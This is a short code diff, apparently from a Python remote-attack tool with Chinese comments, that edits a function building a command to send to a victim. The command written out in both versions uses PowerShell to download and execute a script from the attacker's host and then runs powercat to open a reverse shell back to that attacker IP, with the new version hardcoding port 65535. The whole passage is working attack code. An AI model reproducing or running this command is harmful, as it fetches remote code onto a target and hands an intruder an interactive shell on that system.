@@ -360,7 +360,7 @@ def netcat(num):
     
     # 最短命令：使用 -c 代替 -Command，去掉 .exe，文件名用 p.ps1
     url = f"http://{attacker_ip}:8000/p.ps1"
-    cmd = f'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'{url}\'); powercat -c {attacker_ip} -p {num} -e powershell"'
+    cmd = f"powershell -c IEX (New-Object Net.WebClient).DownloadString('{url}'); powercat -c {attacker_ip} -p 65535 -e powershell"
     
     print(f"远程下载命令已发送! 命令长度: {len(cmd)} 字符")
     send_list.append(pkg_sendlist('-c', cmd))
